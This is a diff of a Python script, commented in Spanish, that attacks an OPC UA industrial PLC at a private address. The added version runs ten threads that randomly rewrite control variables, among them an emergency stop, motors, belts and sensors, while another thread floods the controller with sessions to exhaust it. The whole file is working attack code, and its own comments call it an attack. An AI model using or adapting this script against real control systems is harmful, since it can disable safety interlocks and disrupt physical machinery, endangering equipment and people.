@@ -1,8 +1,10 @@
 from opcua import Client
+import threading
 import time
+import random
 
-# Configuración
 PLC_ENDPOINT = "opc.tcp://10.10.10.53:4840"
+
 VARIABLES = [
     "ACIL_STOP", "DONER_MOTOR_1", "DONER_MOTOR_2", "DONER_MOTOR_3",
     "GRI_BANT", "GRI_SENSOR", "MAVI_BANT", "MAVI_SENSOR",
@@ -12,35 +14,46 @@ VARIABLES = [
     "YESIL_BANT", "YESIL_SENSOR"
 ]
 
-DURATION = 60      # segundos
-FREQ = 0.01        # intervalo entre cambios
+DURATION = 60  # segundos
+THREADS = 10   # número de hilos de ataque
 
 start_time = time.time()
 
-try:
-    client = Client(PLC_ENDPOINT)
-    client.connect()
-    print("[✔] Conexión establecida con el PLC en", PLC_ENDPOINT)
-
-    while time.time() - start_time < DURATION:
-        for var in VARIABLES:
-            try:
-                node = client.get_node(f"ns=4;s=|var|{var}")
-                current = node.get_value()
-                node.set_value(not current)
-                time.sleep(FREQ)
-            except:
-                pass
-
-    elapsed = round(time.time() - start_time, 2)
-    print(f"[✔] Ataque completado. Duración: {elapsed} segundos.")
-
-except Exception as e:
-    print(f"[✘] No se pudo conectar al PLC en {PLC_ENDPOINT}: {e}")
-
-finally:
+def write_spam():
     try:
-        client.disconnect()
+        client = Client(PLC_ENDPOINT)
+        client.connect()
+        while time.time() - start_time < DURATION:
+            for var in VARIABLES:
+                try:
+                    node = client.get_node(f"ns=4;s=|var|{var}")
+                    node.set_value(random.choice([True, False]))  # cambio aleatorio
+                except:
+                    pass
     except:
         pass
+
+def flood_sessions():
+    clients = []
+    while time.time() - start_time < DURATION:
+        try:
+            c = Client(PLC_ENDPOINT)
+            c.connect()
+            clients.append(c)
+        except:
+            break
+
+# Lanzar múltiples hilos de escritura
+for _ in range(THREADS):
+    threading.Thread(target=write_spam).start()
+
+# Lanzar 1 hilo de apertura masiva de sesiones
+threading.Thread(target=flood_sessions).start()
+
+# Esperar final del ataque
+while time.time() - start_time < DURATION:
+    pass
+
+print(f"[✔] Ataque intenso completado. Duración: {DURATION} segundos.")
+
 
